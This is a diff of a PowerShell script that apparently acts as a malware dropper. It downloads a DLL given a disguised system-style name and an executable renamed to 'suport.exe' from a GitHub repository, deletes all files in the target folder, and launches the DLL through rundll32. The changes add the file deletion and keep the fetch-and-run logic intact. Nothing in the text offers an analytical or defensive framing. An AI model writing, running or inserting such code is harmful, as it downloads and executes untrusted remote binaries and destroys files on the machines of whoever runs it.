@@ -5,11 +5,12 @@ If (-not (Test-Path $path_new)){
 }
 $file = "AAAsystem"+ (Get-Random -Maximum 999) + ".dll"
 $location = $path_new + $file;
-$location2 = $path_new + "reports.exe";
+$location2 = $path_new + "suport.exe";
 $uri = "https://github.com/iskww/Atlas/raw/main/win32.dll";
 $uri2 = "https://github.com/iskww/Atlas/raw/main/reports.exe";
+Set-Location $path_new
+Remove-Item *.*
 $cli = New-Object System.Net.WebClient;
 $cmd = $cli.DownloadFile($uri, $location);
-$cmd2 = $cli.DownloadFile($uri2, $location2);
-Set-Location $path_new
+$cmd = $cli.DownloadFile($uri2, $location2);
 Start-Process rundll32.exe -ArgumentList "$file, $call" ;
